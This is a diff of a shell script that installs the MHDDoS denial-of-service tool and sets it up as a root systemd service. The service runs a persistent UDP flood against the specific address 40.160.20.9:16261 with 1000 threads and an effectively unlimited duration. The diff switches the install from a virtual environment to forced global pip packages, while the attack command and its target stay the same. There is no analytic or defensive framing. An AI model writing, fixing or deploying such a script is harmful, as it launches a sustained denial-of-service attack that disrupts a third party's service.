@@ -1,19 +1,16 @@
-# 1. Ensure venv tool is installed (Critical Step)
-sudo apt update && sudo apt install python3-venv python3-pip git -y
+# 1. Install dependencies globally
+sudo apt update && sudo apt install python3 python3-pip git -y
 
-# 2. Go to the directory and wipe any broken venv
+# 2. Go to the directory
 cd /root/MHDDoS
-rm -rf venv
 
-# 3. Create a fresh virtual environment
-python3 -m venv venv
+# 3. Force install requirements globally
+pip3 install --upgrade pip --break-system-packages
+pip3 install -r requirements.txt --break-system-packages
+pip3 install PyRoxy --break-system-packages
 
-# 4. Install the requirements specifically into that venv
-./venv/bin/pip install --upgrade pip
-./venv/bin/pip install -r requirements.txt
-./venv/bin/pip install PyRoxy
-
-# 5. Update the service file to point to the correct path
+# 4. Create the service file using the GLOBAL python3
+# We add PYTHONPATH to the environment so it CANNOT miss the modules
 cat <<EOF | sudo tee /etc/systemd/system/mhddos.service
 [Unit]
 Description=MHDDoS Service
@@ -24,22 +21,22 @@ StartLimitIntervalSec=0
 Type=simple
 User=root
 WorkingDirectory=/root/MHDDoS
-ExecStart=/root/MHDDoS/venv/bin/python3 start.py UDP 40.160.20.9:16261 1000 99999999999
+Environment=PYTHONPATH=/usr/local/lib/python3.12/dist-packages
+ExecStart=/usr/bin/python3 start.py UDP 40.160.20.9:16261 1000 99999999999
 Restart=always
-RestartSec=3s
+RestartSec=5s
 RuntimeMaxSec=10min
 
 [Install]
 WantedBy=multi-user.target
 EOF
 
-# 6. Reload and Kickstart
+# 5. Reload and Start
 sudo systemctl daemon-reload
 sudo systemctl enable mhddos.service
 sudo systemctl restart mhddos.service
 
 echo "------------------------------------------------"
-echo "Verification: Checking if venv exists now..."
-ls -l /root/MHDDoS/venv/bin/python3
-echo "------------------------------------------------"
+echo "Global Force Fix applied."
+sleep 3
 systemctl status mhddos.service
